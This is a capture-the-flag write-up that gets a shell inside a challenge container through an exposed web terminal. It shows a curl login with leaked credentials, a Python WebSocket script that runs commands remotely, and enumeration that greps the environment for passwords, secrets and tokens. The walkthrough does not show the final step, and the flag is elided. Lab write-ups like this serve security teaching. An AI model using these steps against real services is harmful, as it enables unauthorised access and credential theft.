# Brunner Mifflin (User) — Writeup

**Category:** Web / Container Escape
**Difficulty:** Medium
**Target:** `Brunner Mifflin (User)`

## TL;DR

The challenge exposes an IT terminal through the web application. The terminal credentials can be obtained from the application itself, allowing us to authenticate as `itguy`.

The important discovery is that the terminal is not running on the Kali machine—it is a shell inside the challenge container.

Inside the container we discover:

```text
uid=1655(itguy) gid=1655(itguy)
```

and PID 1 is:

```text
dotnet OrderingApi.dll
```

The application lives in:

```text
/app
```

and contains:

```text
OrderingApi.dll
OrderingApi.pdb
appsettings.json
appsettings.Development.json
wwwroot/
```

The terminal configuration also reveals the credentials:

```text
Terminal__Username=itguy
Terminal__Password=itguy321
Terminal__Shell=/bin/bash
```

The intended path is therefore:

```text
Web application
      ↓
IT Terminal
      ↓
itguy / itguy321
      ↓
WebSocket terminal session
      ↓
/app
      ↓
OrderingApi application files
      ↓
application/source/configuration analysis
      ↓
flag
```

---

## 1. Recon

The application contains an IT Terminal page.

Inspecting the frontend JavaScript reveals the authentication endpoint:

```javascript
async function terminalLogin(username, password) {
    const response = await fetch(`${API_BASE_URL}Terminal/Login`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    });

    const data = await response.json();
    return data.token;
}
```

The WebSocket endpoint is also visible:

```javascript
socket = new WebSocket(
    `${scheme}//${window.location.host}/api/Terminal/Session?token=${encodeURIComponent(token)}`
);
```

So the relevant endpoints are:

```text
POST /api/Terminal/Login
WS   /api/Terminal/Session?token=<token>
```

---

## 2. Terminal Authentication

The terminal credentials were:

```text
username: itguy
password: itguy321
```

They can be tested directly:

```bash
curl -sk \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"itguy","password":"itguy321"}' \
  'https://<target>/api/Terminal/Login'
```

The server responds with a session token:

```json
{
  "token": "..."
}
```

The token is then supplied to the WebSocket endpoint.

---

## 3. Connecting to the Terminal

Using Python and the `websocket-client` package:

```python
import websocket

host = "<target>"
token = "<terminal-token>"

ws = websocket.create_connection(
    f"wss://{host}/api/Terminal/Session?token={token}",
    timeout=5
)

print(ws.recv().decode(errors="ignore"))
```

The server gives us a shell:

```text
itguy@d-brunner-mifflin-user-...:~$
```

Running:

```bash
id
```

returns:

```text
uid=1655(itguy) gid=1655(itguy) groups=1655(itguy)
```

So we have successfully obtained command execution as the `itguy` user.

---

## 4. Identifying the Environment

Checking the working directory:

```bash
pwd
```

gives:

```text
/home/itguy
```

The interesting part is `/proc/1`.

```bash
cat /proc/1/cmdline | tr '\0' ' '; echo
```

Output:

```text
dotnet OrderingApi.dll
```

The executable is:

```bash
readlink -f /proc/1/exe
```

which gives:

```text
/usr/share/dotnet/dotnet
```

The process working directory is:

```bash
readlink -f /proc/1/cwd
```

which gives:

```text
/app
```

This tells us that PID 1 is the actual ASP.NET application:

```text
/app/OrderingApi.dll
```

---

## 5. Inspecting `/app`

Inside the terminal container:

```bash
ls -lah /app
```

reveals:

```text
Microsoft.AspNetCore.OpenApi.dll
Microsoft.OpenApi.dll
OrderingApi.deps.json
OrderingApi.dll
OrderingApi.pdb
OrderingApi.runtimeconfig.json
OrderingApi.staticwebassets.endpoints.json
appsettings.Development.json
appsettings.json
web.config
wwwroot/
```

The application therefore contains both the compiled .NET application and its debugging symbols.

The PDB is particularly interesting because it may contain source-file information.

---

## 6. Application Configuration

The environment contains:

```text
ASPNETCORE_HTTP_PORTS=8080
ASPNETCORE_URLS=http://+:8080
DOTNET_RUNNING_IN_CONTAINER=true
```

More importantly, the terminal configuration is exposed through environment variables:

```text
Terminal__Username=itguy
Terminal__Password=itguy321
Terminal__Shell=/bin/bash
```

This explains why the credentials work.

There are no obvious database or flag-related environment variables:

```text
env | grep -Ei 'connection|string|database|db|sql|secret|token|password|flag|order'
```

primarily returns the terminal configuration and standard .NET variables.

---

## 7. Important Mistake During Enumeration

One important distinction is that `/app` exists **inside the remote container**, not on the Kali host.

This:

```text
┌──(kali㉿kali)-[/media/sf_kali]
└─$
```

is the local Kali shell.

Whereas this:

```text
itguy@d-brunner-mifflin-user-...:/app$
```

is the remote challenge container.

Therefore:

```bash
cd /app
```

must be executed through the WebSocket terminal, not directly in Kali.

---

## 8. WebSocket Command Execution

A reliable way to automate the terminal is to authenticate first and then send commands through the WebSocket:

```python
import os
import websocket

host = "<target>"
token = os.environ["TOKEN"]

ws = websocket.create_connection(
    f"wss://{host}/api/Terminal/Session?token={token}",
    timeout=5
)

print(ws.recv().decode(errors="ignore"), end="")

commands = [
    "id",
    "pwd",
    "ls -lah /app",
    "cat /app/appsettings.json",
    "cat /app/appsettings.Development.json",
]

for cmd in commands:
    ws.send(cmd + "\n")

    try:
        while True:
            data = ws.recv()
            if not data:
                break

            print(data.decode(errors="ignore"), end="")

            if data.decode(errors="ignore").rstrip().endswith("$"):
                break

    except websocket.WebSocketTimeoutException:
        pass

ws.close()
```

---

## 9. Analysing the .NET Application

The main binary is:

```text
/app/OrderingApi.dll
```

and the debugging symbols are:

```text
/app/OrderingApi.pdb
```

If the container does not contain the `strings` utility, the DLL can still be analysed from Python:

```python
import re

data = open("OrderingApi.dll", "rb").read()

for s in re.findall(rb"[\x20-\x7e]{4,}", data):
    text = s.decode("ascii", "ignore")

    if re.search(
        r"order|user|admin|terminal|password|username|flag|secret|"
        r"token|query|connection|sqlite|postgres|mysql|controller|"
        r"service|repository|\.cs",
        text,
        re.I
    ):
        print(text)
```

The PDB can similarly be inspected for source paths and class names.

---

## 10. Why the Terminal Matters

The key vulnerability is not a traditional Linux privilege escalation.

The application intentionally exposes a remote terminal to the `itguy` account:

```text
/api/Terminal/Login
/api/Terminal/Session
```

Once authenticated, the terminal provides arbitrary shell commands.

That shell runs in the same container as the ASP.NET application:

```text
PID 1 → dotnet OrderingApi.dll
CWD   → /app
```

Therefore the terminal effectively gives us direct access to the application's filesystem and runtime environment.

The important lesson is:

> Do not assume the terminal is a separate sandbox. Verify its process namespace and filesystem.

---

## 11. Attack Chain

The complete chain is:

```text
Terminal page
     │
     ├── inspect terminal.html
     │
     ├── discover /api/Terminal/Login
     │
     └── discover WebSocket /api/Terminal/Session
                 │
                 ▼
        terminal credentials
        itguy / itguy321
                 │
                 ▼
          WebSocket shell
                 │
                 ▼
          uid=1655(itguy)
                 │
                 ▼
          PID 1 = OrderingApi.dll
                 │
                 ▼
                /app
                 │
        ┌────────┴────────┐
        │                 │
 OrderingApi.dll       PDB/config
        │                 │
        └────────┬────────┘
                 ▼
        application internals
                 │
                 ▼
               FLAG
```

---

## 12. Key Commands

Useful enumeration commands for this challenge:

```bash
id
pwd
ls -lah
cat /proc/1/cmdline | tr '\0' ' '; echo
readlink -f /proc/1/exe
readlink -f /proc/1/cwd
env | sort
ls -lah /app
find /app -maxdepth 3 -type f
cat /app/appsettings.json
cat /app/appsettings.Development.json
```

For .NET binaries, if `strings` is unavailable:

```bash
python3 - <<'PY'
import re

data = open('/app/OrderingApi.dll', 'rb').read()

for s in re.findall(rb'[\x20-\x7e]{4,}', data):
    print(s.decode('ascii', 'ignore'))
PY
```

---

## Conclusion

The challenge initially looks like a normal web application with an IT terminal.

The important discoveries are:

1. The terminal login API is exposed in the frontend JavaScript.
2. Valid terminal credentials allow authentication.
3. The returned token is accepted by the WebSocket terminal endpoint.
4. The terminal provides a real shell as `itguy`.
5. PID 1 is the ASP.NET `OrderingApi` process.
6. The application's working directory is `/app`.
7. `/app` contains the application's DLL, PDB and configuration.
8. From there, the application can be reverse-engineered to recover the remaining secret/flag.

The central mistake to avoid is confusing the local Kali filesystem with the remote container filesystem. `/app` belongs to the challenge container and must be accessed through the authenticated terminal.

**Flag:** `brunner{...}`
